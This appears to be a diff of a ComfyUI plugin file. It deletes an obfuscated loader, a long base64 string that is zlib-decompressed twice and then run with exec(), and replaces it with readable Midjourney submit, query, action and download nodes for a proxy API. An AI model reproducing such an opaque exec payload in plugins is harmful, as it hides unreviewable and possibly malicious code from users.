Pe2GdjQsep7fVZEdc5xk1PLxSFWB8gSSrT+BbzcOV7B4NyrGxifX2ttcLv1h+lj7z3bBO4LBDaHXeu4wBPS/vsCcrsrsjyn/Bd/Uneg1EogZmexlCKn+lHIa0snoNEafypXjiQts2sinc3xLW1VDsBhI97t1MmBbux9yjQ8rp+AWR9y5gfdfwwGYfhGkF+ABtv4pT4I00BMNdc2kbx/FM2AUH5m8kCS9WXhcuyYII2L57SQxCjTX4XERVr/Uw1w9QTL6Qx+3RI9gCbIlILfBm0r0d7d9hP1yQA7DrvJUFvCmBmaLzLiUHH+ALGKBKvgrjgcaZslCS2Cpmy571WH2JoMJ2NS0LgImFQza4XHqYV0k9PmiTqlSSzEFCZDssOTNTDOTgsTNXaP/+pAIAotxnlbWi1+saKpqQ6DCPTPEYVBuhXQCDBltdEnx+HXgAShUXDqWwuHlWLhDNMwlC41f609mRJv/nykgRzLtxRJHCKSRVpNOb9b7ZizFvDqRWc6PA9cXF6k0Qb7jzQDBKLt1cpW9wa1OxvBuXfSM+lHIvW443X0kIFi/yepNWSS5qCoERdkMxTUPWml45XrTSm7+BEwTvmX6jSWFmI4VZynVxbtSK/99zoYzadzbkGzTxd/0MpRzXeAFphXpliSN6ziQT34ar2bVU2fEYQjWugUoSTrJdOBZz31ZA+9O8ktLUY1tL6ZcJXd5/ii/2Qc/+M9SNOqpiafOWsk5N6mycbmW4kdn8ndQmYoHVyW7cqfnABeVmk6iyncpmxY8uxoWPJgnY6GCy4CV5x8vjKafAGIjh44ADBqXlfOs9Rn1ym0lFc2Jk6rDvF6qbiKl6S5P1F1J+YqlNVjrGTs9jlLGWkcYLpwMDR/TV1GkBP5DBO7pjq4mLMfC52zdbUa4SCPoZ3Uwdpl7nA15ituEPAu274MTkq+K2wbqrGwlHaJjkASA2R3LQx6E6TUSd6gf6hBvOJJ6RlSrg1lzmBbsr6dLupz/jboW+qF8juvqtPxFokLGPpHg6Q2QbYmNIpmYjffQnDoMYCUv6I7dmQZBigHDlFACnVUru+U3d2ldgT0Kf1fy+CSBNac1blpMMfvqXEKtTs6+uZ21macGUXVixYry6qVen0Zis4lkbZPPrVu3t8nWF+gyHblEWtfwOkluvp7Ti+E3NZ7xMpRAxBFxmcdZK76+96rEnvcvJrQPxzEPyTP6rO4w4leXb6CCWxHnm6NWiJeaMNI4U9CXk3bdXfzqNk+Hy2VB/USCovT67u3np9djyPocGANVeVk0iTBf1fxWby5KqMBRFP4gBb9DBHajYqMizwyPOhIAGCJAQEPn6S3/Dql17r6pzBFz6EuhwuOk9NDML5VNwpiXt+dq3FL40rFA7BolDdx5dt8lpd5uZwHQqAUD9sncb6Al3p8P7Qmtb4zjEMVpzt2HnbbbpH4/nwU9eRxV362imtVgFKDeg9PnCNRNeU0s+dZEM/FZOZwdb4JIVxCKMbeB9XCPXlfm1ZYhKrPJAPg66mbB302spGgt7w/VKiXKnTVwDMYcHrT+PT65su1H6sK/rwAzwgG0VHnJoluTPLtz5lDxTrs+eCFlxfaFF+zsQwsM6PMrHjFwaK/EAJPtn4Yap2CQ4WKdFpQTsBHYRr55LPnqF43qMTn7lUzVWi2h4JGR3g6wtWnLRO1u84tQaiHHLqqXOqKL35pUigJrd22WSm4jVFvUuanux8MT2yEEx9ljB8NqEctnCu7xTZUfDYjWUl66kJ28MhS5MnGwNao4CW8HyNLyC4/dRt7Zwsm7FPolrFuff5bE46D0j09rMLzoKG4tBWNOWP9UVRPLGuMyZ9/P3AJvrTaP40NwqR1lWNbc7cNgNE0iNUFPHqtuHRlvlQqfv70LDZOM1X+bD5X3Mfsu7BJZvsFT44C7EL7XHLD/9vhRGqc/ZzZp+FaX+eNR3l0WciHjQQjLy87//znrlRw=='
-_d=_z.decompress(_b.b64decode(_d))
-_d=_z.decompress(_b.b64decode(_d))
-exec(_d)
+# wujiai_nodes/mj_nodes_wujiai.py
+import os
+import requests
+import time
+import json
+import re
+import traceback
+import torch
+import numpy as np
+
+import server
+from aiohttp import web
+
+# 从公共工具箱导入核心底座
+from ..utils import (
+    TaskManager,
+    upload_image_wujiai,
+    robust_download_video,
+    VideoAdapter,
+    get_wujiai_host,
+    download_image,              
+    safe_pil_batch_to_tensor
+)
+
+# --- 全局配置 ---
+def resolve_api_key(api_key_from_node: str, channel: str = "grsai") -> str:
+    import builtins
+    import os
+
+    getter = getattr(builtins, "get_api_key", None)
+    if callable(getter):
+        try:
+            return getter(api_key_from_node, channel)
+        except TypeError as exc:
+            if "positional argument" not in str(exc) and "positional arguments" not in str(exc):
+                raise
+            return getter(api_key_from_node)
+
+    if api_key_from_node and api_key_from_node.strip():
+        return api_key_from_node.strip()
+    if channel.lower() == "grsai":
+        return os.getenv("GRSAI_KEY", "").strip()
+    if channel.lower() == "wujiai":
+        return os.getenv("WUJIAI_KEY", "").strip()
+    return ""
+
+HOST = get_wujiai_host()
+mj_task_db = TaskManager("wujiai_mj_history.json", max_completed_history=20)
+
+# ======================================================================
+# 为前端 JS 按钮提供的专属数据接口
+# ======================================================================
+@server.PromptServer.instance.routes.get("/wujiai_mj/get_recent_tasks")
+async def get_recent_tasks(request):
+    """供前端调用的 API，返回最近带有按钮的有效任务列表"""
+    with mj_task_db.lock:
+        tasks = mj_task_db.read_tasks()
+        
+    recent_tasks = ["--- 请选择近期任务 ---"]
+    sorted_tasks = sorted(tasks.items(), key=lambda x: x[1].get('submitted_at', ''), reverse=True)
+    
+    for tid, info in sorted_tasks:
+        if "buttons" in info and len(info["buttons"]) > 0:
+            prompt_snippet = info.get("prompt", "")[:20].replace('\n', ' ')
+            recent_tasks.append(f"{tid} | {prompt_snippet}...")
+            
+    if len(recent_tasks) == 1:
+        recent_tasks.append("暂无包含按钮的历史任务")
+        
+    return web.json_response(recent_tasks)
+
+
+# ======================================================================
+# 节点 1：MJ Imagine (生图提交)
+# ======================================================================
+class MJImagineSubmit:
+    CATEGORY = "Nkxx/Wujiai/MJ"
+    OUTPUT_NODE = True 
+    
+    @classmethod
+    def INPUT_TYPES(cls):
+        return {
+            "required": {
+                "prompt": ("STRING", {"multiline": True, "default": "A cyberpunk cat"}),
+                "model_version": (["v7", "v6.1", "niji 7", "niji 6", "v6.0", "v5.2"], {"default": "v7"}),
+                "aspect_ratio": (["1:1", "16:9", "9:16", "3:4", "4:3", "2:3", "3:2"], {"default": "1:1"}),
+            },
+            "optional": {
+                "extra_args": ("STRING", {"default": "", "multiline": False, "tooltip": "可选附加参数，例如: --iw 1.5 --cw 50"}),
+                "api_key": ("STRING", {"default": "", "placeholder": "留空则读取全局配置"}),
+                "image_prompts": ("IMAGE", {"tooltip": "常规垫图 (图生图)"}),
+                "sref_images": ("IMAGE", {"tooltip": "风格参考 (--sref)"}),
+                "character_refs": ("IMAGE", {"tooltip": "角色/物体参考 (自动适配 --cref / --oref)"}),
+            }
+        }
+        
+    RETURN_TYPES = ("STRING",)
+    RETURN_NAMES = ("report",)
+    FUNCTION = "submit"
+    
+    @classmethod
+    def IS_CHANGED(cls, **kwargs): return time.time_ns()
+
+    def submit(self, prompt, model_version, aspect_ratio, extra_args="", api_key="", 
+               image_prompts=None, sref_images=None, character_refs=None):
+        
+        final_api_key = resolve_api_key(api_key, "wujiai")
+        if not final_api_key: 
+            return {"ui": {"string": ["请配置 Wujiai API Key"]}, "result": ("请配置 Wujiai API Key",)}
+
+        try:
+            # === 核心修复点：增加了对 list 类型的判断与遍历兼容 ===
+            def tensor_to_urls(image_input):
+                if image_input is None: return []
+                
+                # 判断传入的是列表 (DynamicImageList) 还是单一 Tensor，统一转为列表处理
+                image_list = image_input if isinstance(image_input, list) else [image_input]
+                urls = []
+                
+                for img_data in image_list:
+                    # 遍历每一个 tensor 的 batch 维度
+                    for i in range(img_data.shape[0]):
+                        img_tensor = img_data[i:i+1]
+                        url = upload_image_wujiai(final_api_key, img_tensor)
+                        if url: urls.append(url)
+                return urls
+            # ====================================================
+
+            img2img_urls = tensor_to_urls(image_prompts)
+            sref_urls = tensor_to_urls(sref_images)
+            character_urls = tensor_to_urls(character_refs)
+
+            final_prompt = prompt.strip()
+            display_prompt = prompt.strip()
+            
+            # 1. 常规垫图 (拼接在最前)
+            if img2img_urls:
+                final_prompt = " ".join(img2img_urls) + " " + final_prompt
+                img_disp = " ".join([f"[img2img_url_{i+1}]" for i in range(len(img2img_urls))])
+                display_prompt = img_disp + " " + display_prompt
+
+            # 2. 风格参考 SREF
+            if sref_urls:
+                sref_str = " ".join(sref_urls)
+                sref_disp = " ".join([f"[sref_url_{i+1}]" for i in range(len(sref_urls))])
+                if "--sref" in final_prompt:
+                    final_prompt = final_prompt.replace("--sref", f"--sref {sref_str}", 1)
+                    display_prompt = display_prompt.replace("--sref", f"--sref {sref_disp}", 1)
+                else:
+                    final_prompt += f" --sref {sref_str}"
+                    display_prompt += f" --sref {sref_disp}"
+
+            # 3. 角色参考 CREF / OREF
+            if character_urls:
+                char_str = " ".join(character_urls)
+                char_disp = " ".join([f"[cref_url_{i+1}]" for i in range(len(character_urls))])
+                ref_tag = "--oref" if "7" in model_version else "--cref"
+                
+                if ref_tag in final_prompt:
+                    final_prompt = final_prompt.replace(ref_tag, f"{ref_tag} {char_str}", 1)
+                    display_prompt = display_prompt.replace(ref_tag, f"{ref_tag} {char_disp}", 1)
+                else:
+                    final_prompt += f" {ref_tag} {char_str}"
+                    display_prompt += f" {ref_tag} {char_disp}"
+
+            # 4. 宽高比
+            if not re.search(r'--(ar|aspect)\b', final_prompt):
+                final_prompt += f" --ar {aspect_ratio}"
+                display_prompt += f" --ar {aspect_ratio}"
+
+            # 5. 附加参数
+            if extra_args and extra_args.strip():
+                final_prompt += f" {extra_args.strip()}"
+                display_prompt += f" {extra_args.strip()}"
+
+            # 6. 版本号
+            bot_type = "NIJI_JOURNEY" if "niji" in model_version else "MID_JOURNEY"
+            v_suffix = f"--{model_version}" if "niji" in model_version else f"--v {model_version.replace('v', '')}"
+            if not re.search(rf'--(v|niji)\b', final_prompt):
+                final_prompt += f" {v_suffix}"
+                display_prompt += f" {v_suffix}"
+
+            proxy_model = "mj_imagine"
+            payload = {
+                "botType": bot_type,
+                "prompt": final_prompt.strip(),
+                "base64Array": [],
+                "model": proxy_model
+            }
+            
+            headers = {"Authorization": f"Bearer {final_api_key}", "Content-Type": "application/json"}
+            
+            print("\n" + "="*50)
+            print("[MJ Debug] 正在向 API 提交 Imagine 任务...")
+            print(json.dumps(payload, indent=4, ensure_ascii=False))
+            print("="*50 + "\n")
+
+            res = requests.post(f"{HOST}/mj/submit/imagine", headers=headers, json=payload, timeout=30)
+            res.raise_for_status()
+            data = res.json()
+            
+            task_id = str(data.get("result", ""))
+            if not task_id or data.get("code") != 1:
+                raise Exception(f"提交失败: {data}")
+
+            # 调用 TaskManager 更新数据库
+            mj_task_db.update_task(task_id, {
+                "type": "IMAGINE",
+                "model": proxy_model,
+                "prompt": display_prompt, 
+                "submitted_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "status": "running"
+            })
+
+            msg = f"MJ {proxy_model} 提交成功!\nTask ID: {task_id}\nPrompt:\n{display_prompt}"
+            return {"ui": {"string": [msg]}, "result": (msg,)}
+            
+        except Exception as e:
+            traceback.print_exc()
+            err = f"提交失败: {e}"
+            return {"ui": {"string": [err]}, "result": (err,)}
+
+
+# ======================================================================
+# 节点 2：MJ 全局查询
+# ======================================================================
+class MJQueryTasks:
+    CATEGORY = "Nkxx/Wujiai/MJ"
+    OUTPUT_NODE = True
+    
+    @classmethod
+    def INPUT_TYPES(cls):
+        return {"optional": {"api_key": ("STRING", {"default": ""})}}
+        
+    RETURN_TYPES = ("STRING",)
+    RETURN_NAMES = ("report",)
+    FUNCTION = "query"
+    
+    @classmethod
+    def IS_CHANGED(cls, **kwargs): return time.time_ns()
+
+    def query(self, api_key=""):
+        final_api_key = resolve_api_key(api_key, "wujiai")
+        if not final_api_key: 
+            return {"ui": {"string": ["请配置 API Key"]}, "result": ("请配置 API Key",)}
+
+        with mj_task_db.lock:
+            tasks = mj_task_db.read_tasks()
+            
+        headers = {"Authorization": f"Bearer {final_api_key}"}
+        pending_tasks = {k: v for k, v in tasks.items() if v.get("status") in ["running", "SUBMITTED", "IN_PROGRESS"]}
+        
+        for tid, tinfo in pending_tasks.items():
+            try:
+                res = requests.get(f"{HOST}/mj/task/{tid}/fetch", headers=headers, timeout=15)
+                if res.status_code == 200:
+                    d = res.json()
+                    new_status = d.get("status", "running")
+                    
+                    if new_status == "SUCCESS":
+                        mj_task_db.update_task(tid, {
+                            "status": "SUCCESS", 
+                            "image_url": d.get("imageUrl"),
+                            "buttons": d.get("buttons", [])
+                        })
+                    elif new_status == "FAILURE":
+                        mj_task_db.update_task(tid, {
+                            "status": "FAILURE", 
+                            "failReason": d.get("failReason", "未知错误")
+                        })
+            except Exception:
+                pass
+                
+        final_tasks = mj_task_db.read_tasks()
+        report = ["--- MJ 任务队列 ---"]
+        
+        for tid, info in sorted(final_tasks.items(), key=lambda x: x[1].get('submitted_at', ''), reverse=True):
+            status = info.get("status", "unknown")
+            pt = info.get("prompt", "")[:30] + "..."
+            display_model = info.get("model", info.get("type", "UNKNOWN"))
+            report.append(f"[{status}] {display_model} | {tid} | {pt}")
+            
+        full_msg = "\n".join(report)
+        return {"ui": {"string": [full_msg]}, "result": (full_msg,)}
+
+
+# ======================================================================
+# 节点 3：MJ 动作执行 (U/V/Reroll)
+# ======================================================================
+class MJActionSubmit:
+    CATEGORY = "Nkxx/Wujiai/MJ"
+    OUTPUT_NODE = True 
+    
+    @classmethod
+    def INPUT_TYPES(cls):
+        # 这里的下拉选项仅作初始化占位，真实的选项由前端 JS 动态刷新注入
+        with mj_task_db.lock:
+            tasks = mj_task_db.read_tasks()
+            
+        recent_tasks = ["--- 请选择近期任务 ---"]
+        sorted_tasks = sorted(tasks.items(), key=lambda x: x[1].get('submitted_at', ''), reverse=True)
+        
+        for tid, info in sorted_tasks:
+            if "buttons" in info and len(info["buttons"]) > 0:
+                prompt_snippet = info.get("prompt", "")[:20].replace('\n', ' ')
+                recent_tasks.append(f"{tid} | {prompt_snippet}...")
+                
+        if len(recent_tasks) == 1:
+            recent_tasks.append("暂无包含按钮的历史任务")
+
+        return {
+            "required": {
+                "recent_task": (recent_tasks,),
+                # [恢复保留 🔄 符号]
+                "action": (["U1", "U2", "U3", "U4", "V1", "V2", "V3", "V4", "🔄 Reroll"], {"default": "U1"}),
+            },
+            "optional": {
+                "variation_mode": (["默认", "高变化", "低变化"], {"default": "默认"}),
+                "task_id_override": ("STRING", {"default": "", "tooltip": "优先使用此ID覆盖上方选择"}),
+                "api_key": ("STRING", {"default": ""})
+            }
+        }
+    
+    @classmethod
+    def VALIDATE_INPUTS(cls, recent_task, action, variation_mode="默认", task_id_override="", api_key=""):
+        return True
+    
+    RETURN_TYPES = ("STRING",)
+    RETURN_NAMES = ("report",)
+    FUNCTION = "submit_action"
+    
+    @classmethod
+    def IS_CHANGED(cls, **kwargs): return time.time_ns()
+
+    def submit_action(self, recent_task, action, variation_mode="默认", task_id_override="", api_key=""):
+        final_api_key = resolve_api_key(api_key, "wujiai")
+        
+        target_task_id = ""
+        if task_id_override and task_id_override.strip():
+            target_task_id = task_id_override.strip()
+        elif recent_task and recent_task != "--- 请选择近期任务 ---" and recent_task != "暂无包含按钮的历史任务":
+            target_task_id = recent_task.split(" | ")[0].strip()
+            
+        if not final_api_key or not target_task_id: 
+            msg = "错误: 缺少 API_KEY 或未选择/填写 TASK_ID"
+            return {"ui": {"string": [msg]}, "result": (msg,)}
+
+        # 内部映射: 匹配 Discord API 时 Reroll 必须要用到 🔄 这个 emoji
+        target_label = "🔄" if "Reroll" in action else action
+
+        if action.startswith("U"): proxy_model = "mj_upscale"
+        elif action.startswith("V"): 
+            if "低变化" in variation_mode: proxy_model = "mj_low_variation"
+            elif "高变化" in variation_mode: proxy_model = "mj_high_variation"
+            else: proxy_model = "mj_variation"
+        elif "Reroll" in action: proxy_model = "mj_reroll"
+        else: proxy_model = "mj_action"
+
+        with mj_task_db.lock:
+            tasks = mj_task_db.read_tasks()
+            
+        task_info = tasks.get(target_task_id)
+        
+        if not task_info or "buttons" not in task_info:
+            msg = f"找不到任务 {target_task_id} 的按钮数据，请确保 Query 节点刷新过它。"
+            return {"ui": {"string": [msg]}, "result": (msg,)}
+
+        custom_id = None
+        for btn in task_info["buttons"]:
+            if btn.get("label") == target_label or btn.get("emoji") == target_label:
+                custom_id = btn.get("customId")
+                break
+                
+        if not custom_id:
+            msg = f"任务 {target_task_id} 中找不到 {action} 按钮。它可能不是四宫格任务。"
+            return {"ui": {"string": [msg]}, "result": (msg,)}
+
+        try:
+            payload = {
+                "customId": custom_id,
+                "taskId": target_task_id,
+                "chooseSameChannel": True,
+                "model": proxy_model
+            }
+            headers = {"Authorization": f"Bearer {final_api_key}", "Content-Type": "application/json"}
+            
+            print("\n" + "="*50)
+            print(f"[MJ Debug] 正在向 API 提交 Action ({action}) 任务...")
+            print(json.dumps(payload, indent=4, ensure_ascii=False))
+            print("="*50 + "\n")
+
+            res = requests.post(f"{HOST}/mj/submit/action", headers=headers, json=payload, timeout=30)
+            res.raise_for_status()
+            data = res.json()
+
+            new_task_id = str(data.get("result", ""))
+            if not new_task_id or data.get("code") != 1:
+                raise Exception(f"API 拒绝请求: {data}")
+
+            mj_task_db.update_task(new_task_id, {
+                "type": f"ACTION_{action}",
+                "model": proxy_model,
+                "prompt": f"Based on {target_task_id}",
+                "submitted_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "status": "running"
+            })
+
+            success_msg = f"[{proxy_model}] 提交成功!\n动作: {action}\n旧任务: {target_task_id}\n新任务 ID: {new_task_id}\n请随后点击查询节点刷新状态。"
+            return {"ui": {"string": [success_msg]}, "result": (success_msg,)}
+
+        except Exception as e:
+            traceback.print_exc()
+            err_msg = f"Action 异常: {e}"
+            return {"ui": {"string": [err_msg]}, "result": (err_msg,)}
+
+
+# ======================================================================
+# 节点 4：MJ 获取结果 (图片下载与智能切分)
+# ======================================================================
+class MJGetResult:
+    CATEGORY = "Nkxx/Wujiai/MJ"
+    
+    @classmethod
+    def INPUT_TYPES(cls): 
+        return {
+            "optional": {
+                "specific_task_id": ("STRING", {"default": "", "tooltip": "留空则自动拿最老的一个未下载成功任务"}),
+                "split_grid": (["Yes (自动切分四宫格)", "No (保持原图)"], {"default": "Yes (自动切分四宫格)"})
+            }
+        }
+        
+    RETURN_TYPES = ("IMAGE", "STRING")
+    RETURN_NAMES = ("image", "report")
+    FUNCTION = "get_result"
+    
+    @classmethod
+    def IS_CHANGED(cls, **kwargs): return time.time_ns()
+
+    def get_result(self, specific_task_id="", split_grid="Yes (自动切分四宫格)"):
+        # 生成一个黑色的空图片占位符，防止前端弹窗报错
+        empty_image = torch.zeros((1, 1, 1, 3), dtype=torch.float32)
+
+        with mj_task_db.lock:
+            tasks = mj_task_db.read_tasks()
+            
+        target_id = None
+        
+        if specific_task_id.strip():
+            target_id = specific_task_id.strip()
+            if tasks.get(target_id, {}).get("status") != "SUCCESS":
+                target_id = None
+        else:
+            for k, v in sorted(tasks.items(), key=lambda x: x[1].get('submitted_at', '')):
+                if v.get("status") == "SUCCESS":
+                    target_id = k
+                    break
+                    
+        if not target_id:
+            # 修改点：将 None 替换为 empty_image
+            return (empty_image, "暂无下载任务，请运行查询节点刷新任务状态")
+
+        task_info = tasks[target_id]
+        url = task_info.get("image_url")
+        
+        if not url:
+            # 修改点：将 None 替换为 empty_image
+            return (empty_image, "任务成功但未找到 imageUrl")
+
+        try:
+            pil_image = download_image(url)
+            if not pil_image:
+                 raise Exception("下载网络超时或为空")
+                 
+            final_tensor = safe_pil_batch_to_tensor([pil_image])
+            
+            task_type = task_info.get("type", "")
+            is_upscale = task_type.startswith("ACTION_U") 
+            
+            # 自动切分逻辑
+            if "Yes" in split_grid and not is_upscale:
+                b, h, w, c = final_tensor.shape
+                h_mid = h // 2
+                w_mid = w // 2
+                top_left     = final_tensor[:, :h_mid, :w_mid, :]
+                top_right    = final_tensor[:, :h_mid, w_mid:, :]
+                bottom_left  = final_tensor[:, h_mid:, :w_mid, :]
+                bottom_right = final_tensor[:, h_mid:, w_mid:, :]
+                final_tensor = torch.cat([top_left, top_right, bottom_left, bottom_right], dim=0)
+            
+            mj_task_db.update_task(target_id, {"status": "DOWNLOADED"})
+                    
+            msg = f"下载成功并切分: {target_id}" if ("Yes" in split_grid and not is_upscale) else f"下载成功: {target_id}"
+            return (final_tensor, msg)
+            
+        except Exception as e:
+            # 修改点：将 None 替换为 empty_image
+            return (empty_image, f"下载图片失败: {e}")
+
+# --- 节点映射注册 ---
+NODE_CLASS_MAPPINGS = {
+    "MJImagineSubmit": MJImagineSubmit,
+    "MJQueryTasks": MJQueryTasks,
+    "MJActionSubmit": MJActionSubmit,
+    "MJGetResult": MJGetResult,
+}
+
+NODE_DISPLAY_NAME_MAPPINGS = {
+    "MJImagineSubmit": "1. MJ 生图提交 (Imagine)",
+    "MJQueryTasks": "2. MJ 全局查询 (Query)",
+    "MJActionSubmit": "3. MJ 动作执行 (U/V/Reroll)",
+    "MJGetResult": "4. MJ 获取出图 (Get Result)",
+}
